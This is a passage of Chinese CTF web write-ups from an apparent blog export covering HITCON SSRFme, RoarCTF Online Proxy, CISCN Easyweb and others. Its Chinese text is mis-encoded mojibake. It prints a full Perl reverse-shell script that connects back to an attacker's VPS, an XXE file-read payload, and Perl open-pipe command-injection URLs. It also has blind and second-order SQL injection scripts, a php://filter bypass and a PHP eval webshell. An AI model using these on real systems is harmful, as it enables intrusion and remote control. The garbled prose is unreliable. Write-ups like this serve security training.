è¿™ä¸ªåœ°æ–¹å­¦åˆ°äº†æ–°ä¸œè¥¿ï¼šåˆ©ç”¨linuxç³»ç»Ÿçš„procè¿›ç¨‹æ–‡ä»¶ç³»ç»Ÿæ‰¾å½“å‰è¿›ç¨‹ä¸­çš„æ–‡ä»¶ï¼Œè¿™ä¸ªåœ°æ–¹å‚è€ƒäº†ç½‘ä¸Šçš„é¢˜è§£ï¼Œè™½ç„¶æ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯è¿˜æ˜¯å­¦åˆ°äº†æ–°ä¸œè¥¿ï¼Œæ„Ÿè§‰ä»¥åä¼šç”¨å¾—åˆ°ã€‚å…³äºprocè¿›ç¨‹æ–‡ä»¶ç³»ç»Ÿå‚è€ƒè¿™é‡Œã€‚ æœ€åæ‹¿åˆ°flagçš„payloadå¦‚ä¸‹ï¼š &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM \"file:flag.txt\"&gt; ]&gt;&lt;svg height=\"300\" width=\"3000\"&gt; &lt;text x=\"0\" y=\"15\" fill=\"red\"&gt;test &amp;xxe; test&lt;/text&gt;&lt;/svg&gt; åˆ©ç”¨fileå‘½ä»¤ç›´æ¥è¯»flagæ–‡ä»¶ï¼Œå³å¯æ‹¿åˆ°flagã€‚ çœ‹å›½å¤–å¤§ä½¬çš„é¢˜è§£ï¼Œè®²åˆ°äº†åˆšå¼€å§‹æƒ³åˆ°äº†ImageTragickï¼Œä¹Ÿæ˜¯ä¹‹å‰ä¸ç†Ÿæ‚‰çš„çŸ¥è¯†ï¼Œéœ€è¦å¥½å¥½å­¦ä¹ ï¼Œå‚è€ƒè¿™é‡Œã€‚ èµ›é¢˜BUUä¸Šéƒ½å¯ä»¥å¤ç°","link":"/2020/02/18/BSidesSF2019-WriteUp/"},{"title":"BUUCTF-webåˆ·é¢˜â…¢","text":"BUUåˆ·é¢˜è®°å½•ä¹‹ä¸‰äº†ï¼Œåˆ·é¢˜æœç„¶å¼€çœ¼ç•Œï¼Œä¸è¿‡â€¦ æˆ‘å¥½èœğŸ˜ï¼Œä¸æ˜¯é‚£ä¸ªè”¡ğŸ˜’ [HITCON 2017]SSRFmeä¸»è¦è€ƒå¯ŸPerlä¸‹å­˜åœ¨çš„æ¼æ´ï¼šCVE-2016-1238å’Œopenå‘½ä»¤å¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚åˆ©ç”¨æ­¤æ¼æ´è¿›è¡ŒSSRFã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºäº†å¦‚ä¸‹çš„æºç ï¼š &lt;?php $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"])); $info = pathinfo($_GET[\"filename\"]); $dir = str_replace(\".\", \"\", basename($info[\"dirname\"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\"basename\"]), $data); highlight_file(__FILE__); åŒæ—¶ä¹Ÿç»™å‡ºäº†REMOTE_ADDRï¼Œè¿™åœ¨åé¢è§£é¢˜ç”¨å¾—åˆ°ã€‚åˆ†æä»£ç æˆ‘ä»¬å¯ä»¥æ¢³ç†å‡ºå…¶é€»è¾‘ï¼š 1.åŸºäºREMOTE_ADDRåˆ›å»ºæ²™ç®±æ–‡ä»¶å¤¹ï¼›2.å°†ä¼ å…¥çš„URLå¸¦å…¥å‘½ä»¤GETæ‰§è¡Œã€‚è¿™é‡Œçš„GETå‘½ä»¤æ˜¯Lib for WWW in Perlä¸­çš„å‘½ä»¤ï¼Œç›®çš„æ˜¯æ¨¡æ‹Ÿhttpçš„GETè¯·æ±‚ï¼›3.åˆ©ç”¨pathinfoå‡½æ•°è§£æä¼ å…¥çš„filenameå‚æ•°ï¼Œè·å–è·¯å¾„åæœ€åä¸€å±‚æ–‡ä»¶å¤¹åˆ›å»ºå¹¶è¿›å…¥è¯¥è·¯å¾„ï¼›4.åˆ©ç”¨basenameå‡½æ•°è·å–filenameä¼ å‚å†…å®¹çš„æœ€åä»¥åŠæ–‡ä»¶å¤¹åç§°ï¼›5.åˆ©ç”¨â€‹file_put_contentså‡½æ•°å°†GETå‘½ä»¤æ‰§è¡Œçš„ç»“æœå†™å…¥ä»¥filenameä¸­çš„æ–‡ä»¶åå‘½åçš„æ–‡ä»¶ä¸­ã€‚ è¿™ä¸€é“é¢˜æ¶‰åŠçš„çŸ¥è¯†ä¹‹å‰æ²¡é‡åˆ°è¿‡ï¼Œéœ€è¦å¥½å¥½å­¦ä¸€å­¦ï¼Œå‚è€ƒç½‘ä¸Šçš„é¢˜è§£å¾—çŸ¥æœ‰ä¸¤ç§è§£é¢˜æ€è·¯ï¼š åˆ©ç”¨Perl5çš„ä¸€ä¸ªCVE åˆ©ç”¨Perlçš„openå‘½ä»¤è¿›è¡Œå‘½ä»¤æ‰§è¡Œ åˆ©ç”¨CVE-2016-1238æ¼æ´å¤§è‡´æ„æˆåŸå› æ˜¯ï¼š` å½“è§£æé‡åˆ°äº†éå®šä¹‰çš„åè®®(å®šä¹‰çš„åè®®åœ¨perl5/LWP/Protocolæ–‡ä»¶å¤¹ä¸‹å¯ä»¥çœ‹åˆ°ï¼Œé»˜è®¤æ”¯æŒGHTTPã€cpanã€dataã€fileã€ftpã€gopherã€httpã€httpsã€loopbackã€mailtoã€nntpã€nogoåè®®)æ—¶, å¦‚GGBON://ggb0n.comï¼Œä¼šè‡ªåŠ¨è¯»å–å½“å‰ç›®å½•ä¸‹çš„URIç›®å½•å¹¶æŸ¥çœ‹æ˜¯å¦æœ‰å¯¹åº”åè®®çš„pmæ¨¡å—å¹¶å°è¯•eval &quot;require xxx&quot;ï¼Œè¿™é‡Œæˆ‘ä»¬çš„æ¶æ„pmæ¨¡å—å°±ä¼šè¢«æ‰§è¡Œã€‚ å€Ÿæ­¤æ¼æ´æ„é€ ä¸€ä¸ªåå¼¹shellçš„perlè„šæœ¬æ”¾åˆ°è‡ªå·±çš„VPSä¸Šï¼š #!/usr/bin/perl -w# perl-reverse-shell - A Reverse Shell implementation in PERLuse strict;use Socket;use FileHandle;use POSIX;my $VERSION = \"1.0\";# Where to send the reverse shell. Change these.my $ip = '127.0.0.1';my $port = 12345;# Optionsmy $daemon = 1;my $auth = 0; # 0 means authentication is disabled and any # source IP can access the reverse shellmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);# Declarationsmy $global_page = \"\";my $fake_process_name = \"/usr/sbin/apache\";# Change the process name to be less conspicious$0 = \"[httpd]\";# Authenticate based on source IP address if requiredif (defined($ENV{'REMOTE_ADDR'})) { cgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\"); if ($auth) { unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) { cgiprint(\"ERROR: Your client isn't authorised to view this page\"); cgiexit(); } }} elsif ($auth) { cgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address. Denying access\"); cgiexit(0);}# Background and dissociate from parent process if requiredif ($daemon) { my $pid = fork(); if ($pid) { cgiexit(0); # parent exits } setsid(); chdir('/'); umask(0);}# Make TCP connection for reverse shellsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) { cgiprint(\"Sent reverse shell to $ip:$port\"); cgiprintpage();} else { cgiprint(\"Couldn't open reverse shell to $ip:$port: $!\"); cgiexit(); }# Redirect STDIN, STDOUT and STDERR to the TCP connectionopen(STDIN, \"&gt;&amp;SOCK\");open(STDOUT,\"&gt;&amp;SOCK\");open(STDERR,\"&gt;&amp;SOCK\");$ENV{'HISTFILE'} = '/dev/null';system(\"w;uname -a;id;pwd\");exec({\"/bin/sh\"} ($fake_process_name, \"-i\"));# Wrapper around printsub cgiprint { my $line = shift; $line .= \"&lt;p&gt;\\n\"; $global_page .= $line;}# Wrapper around exitsub cgiexit { cgiprintpage(); exit 0; # 0 to ensure we don't give a 500 response.}# Form HTTP response using all the messages gathered by cgiprint so farsub cgiprintpage { print \"Content-Length: \" . length($global_page) . \"\\r Connection: close\\r Content-Type: text\\/html\\r\\n\\r\\n\" . $global_page;} ç„¶ååˆ©ç”¨ä»£ç çš„é€»è¾‘æ„é€ payloadï¼š /?url=your vps's perl backdoor&amp;filename=URI/ggb0n.pm è¿™å°±åœ¨æ²™ç®±æ–‡ä»¶å¤¹çš„URLä¸‹å†™å…¥äº†åå¼¹shellçš„pmæ–‡ä»¶ï¼Œæœ€ååœ¨ä¸ªäººçš„VPSä¸Šç›‘å¬pmæ–‡ä»¶ä¸­å†™å¥½çš„ç«¯å£å¹¶æ„é€ å¦‚ä¸‹çš„payloadè¿›è¡Œè®¿é—®ï¼š /?url=GGBON://ggb0n.com&amp;filename=xxx å³å¯æ‹¿åˆ°shellã€‚æ³¨æ„ï¼šè¿™é‡Œçš„GGBONå¯ä»¥ä¸ºä»»æ„çš„ä¸å±äºä¸Šé¢è¯´åˆ°çš„å¯ä»¥è§£æçš„å­—ç¬¦ä¸²ã€‚ åˆ©ç”¨perlçš„openå‘½ä»¤è¿›è¡ŒSSRFé¦–å…ˆæ‰©å±•ä¸€ä¸‹openå‘½ä»¤å¯¼è‡´å‘½ä»¤æ‰§è¡Œçš„è¿‡ç¨‹ï¼Œå‚è€ƒç½‘ä¸Šçš„èµ„æ–™ï¼š Executing Programs with â€œopenâ€In addition to what we saw last week, the â€œopenâ€ command has one more verypowerful application: it allows you to execute a command, send input andreceive output.Try this program (it only works on Unix): #!/usr/bin/perl -w use strict; open DATA, \"who |\" or die \"Couldn't execute program: $!\"; while ( defined( my $line = &lt;DATA&gt; ) ) { chomp($line); print \"$line\\n\"; } close DATA; Hereâ€™s what happened: Perl saw that your â€œfileâ€ ended with a â€œpipeâ€ (verticalbar) character. So it interpreted the â€œfileâ€ as a command to be executed, and interpreted the commandâ€™s output as the â€œfileâ€â€˜s contents. The command is â€œwhoâ€ (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you. In this case, we â€œreadâ€ data from the command. To execute a command that we can â€œwriteâ€ (send data) to, we should place a pipe character BEFORE the command. These options are mutually exclusive: we can read from a command or write to it, but not both. In the Unix world, a lot can be done by piping the output of one program into the input of another. Perl continues this spirit. Note that we can also send command-line parameters to the command, like this: open DATA, \"who -H |\" or die \"Couldn't execute program: $!\"; In fact, Perl allows you to use â€œopenâ€ to do pretty much anything you would normally do on the command-line, as this example demonstrates: open OUTPUT, \"| grep 'foo' &gt; result.txt\" or die \"Failure: $!\"; We can then write whatever we want to the â€œOUTPUTâ€ filehandle. The Unix â€œgrepâ€ command will filter out any text which doesnâ€™t contain the text â€œfooâ€; any text which DOES contain â€œfooâ€ will be written to â€œresult.txtâ€. perlä¸‹openå‘½ä»¤çš„featureä»£ç å¤„ç†fileåè®®çš„ä»£ç åœ¨perl5/LWP/Protocol/file.pmä¸‹ï¼š ...#ç¬¬47è¡Œ # test file exists and is readable unless (-e $path) { return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_NOT_FOUND, \"File `$path' does not exist\"); } unless (-r _) { return HTTP::Response-&gt;new( &amp;HTTP::Status::RC_FORBIDDEN, 'User does not have read permission'); }...#ç¬¬127è¡Œ # read the file if ($method ne \"HEAD\") { open(F, $path) or return new HTTP::Response(&amp;HTTP::Status::RC_INTERNAL_SERVER_ERROR, \"Cannot read file '$path': $!\"); binmode(F); $response = $self-&gt;collect($arg, $response, sub { my $content = \"\"; my $bytes = sysread(F, $content, $size); return \\$content if $bytes &gt; 0; return \\ \"\"; }); close(F); }... é¦–å…ˆå¾—æ»¡è¶³å‰é¢çš„æ–‡ä»¶å­˜åœ¨, æ‰ä¼šç»§ç»­åˆ°openè¯­å¥, æ‰€ä»¥åœ¨æ‰§è¡Œå‘½ä»¤å‰å¾—ä¿è¯æœ‰ç›¸åº”çš„åŒåæ–‡ä»¶, æ‰€ä»¥å…ˆè¯·æ±‚ï¼š /?url=file:bash -c /readflag|&amp;filename=bash -c /readflag| ç„¶åè¯·æ±‚å¦‚ä¸‹çš„payloadæ¥åˆ›å»ºç›¸åº”çš„åŒåæ–‡ä»¶ï¼š /?url=file:bash -c /readflag|&amp;filename=123 æœ€ååˆ©ç”¨opençš„featureæ‰§è¡Œä»£ç è®¿é—®/sandbox/å“ˆå¸Œå€¼/123å°±èƒ½å¾—åˆ°flagã€‚ å…¶å®è¿˜ä¸æ˜¯å¾ˆæ‡‚ï¼Œå…ˆç•™åœ¨è¿™ï¼Œå†æ…¢æ…¢å­¦ä¹ ã€‚ [RoarCTF 2019]Online ProxyXFFå¤„å­˜åœ¨äºŒæ¬¡æ³¨å…¥ è§£é¢˜è¿›å…¥é¢˜ç›®æŸ¥çœ‹æºç å‘ç°ï¼š &lt;!-- Debug Info: Duration: 0.029144048690796 s Current Ip: 174.0.81.45 --&gt; è¿™é‡Œæç¤ºå½“å‰çš„IPï¼Œæƒ³åˆ°åˆ©ç”¨å·¥å…·æ”¹ä¸€ä¸‹XFFè¯•è¯•ï¼Œç»“æœå‘ç°å›æ˜¾å¦‚ä¸‹ï¼š &lt;!-- Debug Info: Duration: 0.035063982009888 s Current Ip: 127.0.0.1 Last Ip: 174.0.81.45 --&gt; è¯´æ˜äº†ä¸Šä¸€ä¸ªIPè¢«è®°å½•äº†èµ·æ¥ï¼Œå½“ç„¶ä¹Ÿåªèƒ½æ˜¯è®°å½•åœ¨æ•°æ®åº“ä¸­ï¼Œé‚£ä¹ˆå¦‚æœæ„é€ ä¸€ä¸ªSQLæ³¨å…¥è¯­å¥çš„XFFå¤´ä¸Šä¼ ï¼Œç„¶åå†éšä¾¿æ¢ä¸€ä¸ªXFFå¤´è®¿é—®ï¼Œä¸å°±æ˜¯å¯ä»¥å‡ºå‘äºŒæ¬¡æ³¨å…¥äº†å—ï¼Œæœ€ç»ˆç”¨èµµå¸ˆå‚…çš„è„šæœ¬è·‘å‡ºäº†ç»“æœã€‚å‚è€ƒèµµå¸ˆå‚…çš„è„šæœ¬ï¼š import requeststarget = \"http://node3.buuoj.cn:28041/\"def execute_sql(sql): print(\"[*]è¯·æ±‚è¯­å¥ï¼š\" + sql) return_result = \"\" payload = \"0'|length((\" + sql + \"))|'0\" session = requests.session() r = session.get(target, headers={'X-Forwarded-For': payload}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --&gt;\", start_pos) length = int(r.text[start_pos + 9: end_pos]) print(\"[+]é•¿åº¦ï¼š\" + str(length)) for i in range(1, length + 1, 5): payload = \"0'|conv(hex(substr((\" + sql + \"),\" + str(i) + \",5)),16,10)|'0\" r = session.get(target, headers={'X-Forwarded-For': payload}) # å°†è¯­å¥æ³¨å…¥ r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) # æŸ¥è¯¢ä¸Šæ¬¡IPæ—¶è§¦å‘äºŒæ¬¡æ³¨å…¥ r = session.get(target, headers={'X-Forwarded-For': 'glzjin'}) # å†æ¬¡æŸ¥è¯¢å¾—åˆ°ç»“æœ start_pos = r.text.find(\"Last Ip: \") end_pos = r.text.find(\" --&gt;\", start_pos) result = int(r.text[start_pos + 9: end_pos]) return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8') print(\"[+]ä½ç½® \" + str(i) + \" è¯·æ±‚äº”ä½æˆåŠŸ:\" + bytes.fromhex(hex(result)[2:]).decode('utf-8')) return return_result# è·å–æ•°æ®åº“print(\"[+]è·å–æˆåŠŸï¼š\" + execute_sql(\"SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA\"))# è·å–æ•°æ®åº“è¡¨print(\"[+]è·å–æˆåŠŸï¼š\" + execute_sql(\"SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'\"))# è·å–æ•°æ®åº“è¡¨print(\"[+]è·å–æˆåŠŸï¼š\" + execute_sql(\"SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' \"))# è·å–è¡¨ä¸­å†…å®¹print(\"[+]è·å–æˆåŠŸï¼š\" + execute_sql(\"SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e\")) [Black Watch å…¥ç¾¤é¢˜]Webè€ƒå¯Ÿå¼‚æˆ–æ³¨å…¥ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®çœ‹åˆ°å¦‚ä¸‹çš„ç•Œé¢ï¼šç‚¹å‡»çƒ­ç‚¹åˆ—è¡¨é‡Œé¢çš„å­—çš„æ—¶å€™ä¼šè·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼ŒåŒæ—¶è¿˜æœ‰ç™»å½•é¡µé¢ï¼Œèµ·åˆçŒœæµ‹æ˜¯æ³¨å…¥æ˜¯åœ¨ç™»å½•é¡µé¢ï¼Œé‚£é‡Œé€šè¿‡JSONå¯¹usernameå’Œpasswordè¿›è¡Œä¼ å‚ï¼Œå‰é¢åšäº†JSONä¸­è¿›è¡Œæ³¨å…¥çš„é¢˜ç›®ï¼Œä½†æ˜¯è¿™é“é¢˜çš„æ³¨å…¥ç‚¹å…¶å®æ˜¯åœ¨è·³è½¬çš„é‚£ä¸ªé¡µé¢ï¼ŒæŠ“åŒ…å¯ä»¥å‘ç°ï¼šè¿™ä¸ªé¡µé¢æ˜¯åˆ©ç”¨GETæ–¹å¼ç›´æ¥è¿›è¡Œidä¼ å‚çš„ï¼Œå­˜åœ¨æ³¨å…¥çš„å¯èƒ½æ€§æ›´å¤§ï¼Œåæ¥å°è¯æ˜¯å¼‚æˆ–æ³¨å…¥ï¼Œç”¨è„šæœ¬è·‘ã€‚ è§£é¢˜è„šæœ¬import requestsimport urllibimport sysfrom time import sleep# if correct , return empty, else return somethingurl = \"http://c385297f-15e1-4d95-a39b-3f2aa03b3822.node3.buuoj.cn/backend/content_detail.php?id=\"#payload = \"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{0},1))&gt;{1})\"# [+] --&gt;admin,contents&lt;--#payload = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),{0},1))&gt;{1})\"# id,title,content,is_enable#payload = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),{0},1))&gt;{1})\"# id,username,password,is_enable#payload = \"1^(ord(substr((select(group_concat(password))from(admin)),{0},1))&gt;{1})\"payload = \"1^(ord(substr((select(group_concat(username))from(admin)),{0},1))&gt;{1})\"result = \"\"index = 1while True: u_bound = 255; l_bound = 0 while u_bound &gt;= l_bound: m_bound = (u_bound + l_bound) // 2 payload_tmp = payload.format(index, m_bound) url_tmp = url + urllib.parse.quote(payload_tmp) res = requests.get(url_tmp).content.decode('utf8') # print(res) # exit(0) # sleep(1) if \"title\" in res: u_bound = m_bound - 1 tmp = m_bound else: l_bound = m_bound + 1 # print(tmp) result += chr(tmp) index += 1 # sys.stdout.write(\"[+] --&gt;%s&lt;--\\r\" % (result)) # sys.stdout.flush() print(result) è·‘å‡ºæ¥ä¸¤ç»„ç”¨æˆ·åå’Œå¯†ç ï¼Œç»„åˆå°è¯•å°±è¡Œäº†ã€‚ [HarekazeCTF2019]encode_and_encodeè€ƒå¯Ÿé€šè¿‡JSONè½¬ä¹‰å­—ç¬¦ä¸²ç»•è¿‡ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œåœ¨ç¬¬ä¸‰ä¸ªæŒ‰é’®çœ‹åˆ°æºç ï¼š &lt;?phperror_reporting(0);if (isset($_GET['source'])) { show_source(__FILE__); exit();}function is_valid($str) { $banword = [ // no path traversal '\\.\\.', // no stream wrapper '(php|file|glob|data|tp|zip|zlib|phar):', // no data exfiltration 'flag' ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $str)) { return false; } return true;}$body = file_get_contents('php://input');$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json['page'])) { $page = $json['page']; $content = file_get_contents($page); if (!$content || !is_valid($content)) { $content = \"&lt;p&gt;not found&lt;/p&gt;\\n\"; }} else { $content = '&lt;p&gt;invalid request&lt;/p&gt;';}// no data exfiltration!!!$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&amp;lt;censored&amp;gt;}', $content);echo json_encode(['content' =&gt; $content]); é€šè¿‡å®¡è®¡ä»£ç å‘ç°ï¼Œis_valid()å‡½æ•°ä¸­é€šè¿‡é»‘åå•è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ä¸²ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯å¯èƒ½ç”¨åˆ°çš„åè®®ã€‚ç„¶åæˆ‘ä»¬å‘ç°bodyçš„å€¼æ˜¯é€šè¿‡file_get_contents('php://input')ä¼ è¿‡æ¥çš„ï¼ŒæŸ¥äº†ä¸€ä¸‹æ¶¨çŸ¥è¯†äº†ï¼š å¦‚æœPOSTçš„åŸå§‹æ•°æ®æ˜¯ä¸€ç»´æ•°ç»„æˆ–&amp;æ‹¼æ¥çš„æ ‡å‡†æ ¼å¼çš„é”®å€¼å¯¹å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨$_POSTæ¥è·å–ã€‚å¦‚æœå‘é€jsonå­—ç¬¦ä¸²ï¼Œä¸€èˆ¬è¦é€šè¿‡file_get_contentsè·å–ã€‚ å› ä¸ºè¿™é‡Œæ˜¯é€šè¿‡JSONç¼–ç ä¼ è¾“çš„ï¼Œå› æ­¤ç”¨è¿™ç§æ–¹å¼ï¼Œç„¶åå¯¹bodyçš„å€¼è¿›è¡Œè§£ç å¹¶èµ‹å€¼ç»™jsonã€‚ç„¶åå†åˆ©ç”¨è‡ªå®šä¹‰çš„is_valid()å‡½æ•°è¿›è¡Œåˆ¤æ–­ï¼Œå¹¶ä¸”å¯ä»¥çœ‹å‡ºjsonä¸­æœ‰pageè¿™ä¸ªé”®å€¼å¯¹ã€‚æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡JSONä¼ è¾“æ•°æ®æ¥è¯»å–åˆ°flagï¼Œè¿™é‡Œå°±éœ€è¦ç”¨åˆ°phpçš„ä¼ªåè®®äº†ï¼Œä½†æ˜¯phpå·²ç»è¢«banäº†ï¼Œä½†æ˜¯çš„ä½†æ˜¯ï¼š\\uXXXXå¯ä»¥åœ¨JSONä¸­è½¬ä¹‰å­—ç¬¦ï¼Œä¾‹å¦‚A=\\u0041ï¼Œå› æ­¤åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥è¿›è¡Œç»•è¿‡ã€‚ è§£é¢˜æœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹ï¼š {\"page\":\"\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067\"}/* \\u0070\\u0068\\u0070è¡¨ç¤ºphpï¼›\\u0066\\u006c\\u0061\\u0067è¡¨ç¤ºflag */ æˆåŠŸæ‹¿åˆ°flagï¼š [CISCN 2019]Easywebæ•æ„Ÿæ–‡ä»¶æ³„éœ²ï¼Œæ–‡ä»¶ä¸Šä¼ æ—¶çŸ­æ ‡ç­¾ç»•è¿‡phpè¿‡æ»¤ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œè®¿é—®robots.txtå‘ç°æºç å¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½åˆ°iamge.php.bakï¼Œæºç å¦‚ä¸‹ï¼š &lt; ?phpinclude \"config.php\";$id=isset($_GET[\"id\"])?$_GET[\"id\"]:\"1\";$path=isset($_GET[\"path\"])?$_GET[\"path\"]:\"\";$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$id);$path=str_replace(array(\"\\\\0\",\"%00\",\"\\\\'\",\"'\"),\"\",$path);$result=mysqli_query($con,\"select * from images where id='{$id}' or path='{$path}'\");$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=\"./\" . $row[\"path\"];header(\"Content-Type: image/jpeg\");readfile($path); å®¡è®¡ä»£ç å‘ç°åº”è¯¥éœ€è¦è¿›è¡Œsqlæ³¨å…¥ï¼Œä½†æ˜¯å•å¼•å·è¢«è¿‡æ»¤æ‰äº†ã€‚ç”±äºè½¬ä¹‰å‡½æ•°addslashesçš„å­˜åœ¨ï¼ŒåŒæ—¶\\0ã€'è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥è¾“å…¥\\0ï¼Œç»è¿‡addslasheså‡½æ•°ä¼šå…ˆå˜æˆ\\\\0,ç„¶åç»è¿‡str_replaceå‡½æ•°ï¼Œä¼šå˜æˆ\\ï¼Œè¿™æ ·ï¼Œå°±æŠŠidåé¢çš„å•å¼•å·ç»™è½¬ä¹‰äº†ã€‚æ‰€ä»¥å¯ä»¥æ„é€ ç±»ä¼¼ä¸‹é¢çš„payloadï¼š http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\0'&amp;path= or 1=1%23 åå°æ‰§è¡Œçš„sqlè¯­å¥ä¾¿æ˜¯ï¼š select * from images where id='\\' or path=' or 1=1# ä»è€Œç»•è¿‡äº†è¿‡æ»¤ï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸€ç‚¹å†™è„šæœ¬æ³¨å…¥ï¼š import requestsimport timename=''for j in range(1,21): l = 32 h = 127 while abs(l-h)&gt;1: i=int((l+h)/2) url=\"http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\\\0'&amp;path= or ascii(substr((select password from users),\"+str(j)+\",1))&gt;\"+str(i)+\"%23\" r = requests.get(url) time.sleep(0.005) if r.status_code=='429': print('to fast') if not 'Content-Length' in r.headers: l = i else: h = i name += chr(h)print(name) æ‹¿åˆ°å¯†ç ä¹‹åï¼Œç”¨adminèº«ä»½ç™»å½•ï¼Œå‘ç°éœ€è¦è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼Œå¹¶ä¸”ä¼šå°†æ–‡ä»¶åå’Œç”¨æˆ·åå†™å…¥æ—¥å¿—æ–‡ä»¶ã€‚ç”±äºæ—¥å¿—æ–‡ä»¶çš„æ ¼å¼æ˜¯phpçš„ï¼Œå› æ­¤è€ƒè™‘å†™å…¥shellã€‚è¿™é‡Œç”±äºç”¨æˆ·åå·²ç»æ˜¯adminä¸å¯å˜çš„ï¼Œé‚£å°±éœ€è¦åœ¨æ–‡ä»¶åä¸Šåšæ‰‹è„šï¼Œä½†æ˜¯æ–‡ä»¶åè¿›è¡Œäº†php/içš„è¿‡æ»¤ï¼Œæ­¤å¤„åˆ©ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š filename=\"&lt;?=$_GET['cmd']; eval($_POST['cmd']); ?&gt;\" å…³äºçŸ­æ ‡ç­¾æ‰©å±•ä¸€ä¸‹ï¼š çŸ­æ ‡ç­¾&lt;? ?&gt;éœ€è¦php.iniå¼€å¯short_open_tag = Onï¼Œä½†&lt;?= ?&gt;ä¸å—è¯¥æ¡æ§åˆ¶ã€‚ ä¸Šä¼ å°é©¬ä¹‹åï¼Œå¾—åˆ°å¦‚ä¸‹çš„æ–‡ä»¶åï¼Œç„¶åèšå‰‘è¿æ¥æ‹¿åˆ°shellï¼Œå³å¯æ‹¿åˆ°flagã€‚ [GXYCTF2019]BabySQliè€ƒå¯Ÿç‚¹ï¼šå¤šæ¬¡ç¼–ç (base32ã€base64)ï¼Œunion selectæ³¨å…¥ç»“åˆmd5é€šè¿‡åå°åˆ¤æ–­ã€‚ é¢˜ç›®åˆ†æéšä¾¿è¾“å…¥ç”¨æˆ·åå¯†ç åï¼ŒæŸ¥çœ‹æºç å‘ç°ä¸€ä¸²base32ï¼š MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 è§£ç ä¹‹åï¼š c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== å†é€šè¿‡base64è§£ç ï¼š select * from user where username = '$name' ç”±æ­¤å¯è§ï¼Œåœ¨usernameå¤„å­˜åœ¨æ³¨å…¥ç‚¹ã€‚ç”¨å¸¸è§„çš„æ³¨å…¥æµ‹è¯•ä¸€ä¸‹ï¼š ' union select 1,2,3%23 æç¤ºwrong userï¼Œæ¥ç€æˆ‘ä»¬æŠŠadminåˆ†åˆ«æ›¿æ¢1ã€2ã€3çš„ä½ç½®ï¼Œå‘ç°æ›¿æ¢2çš„æ—¶å€™æŠ¥é”™å˜æˆwrong passè¯´æ˜äº†usernameå°±æ˜¯åœ¨ç¬¬äºŒä¸ªä½ç½®ï¼ŒåŸé¢˜æç¤ºäº†md5ï¼Œè‚¯å®šæ˜¯å¯¹å¯†ç è¿›è¡Œäº†å“ˆå¸Œï¼Œé‚£ä¹ˆå¯ä»¥æ¨æ–­ï¼Œ3å¤„åº”è¯¥æ›¿æ¢ä¸ºå¯†ç çš„å“ˆå¸Œå€¼ã€‚é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ä¸Šé¢çš„è¯­å¥ï¼Œå†æŠŠéšä¾¿è¾“å…¥çš„å¯†ç 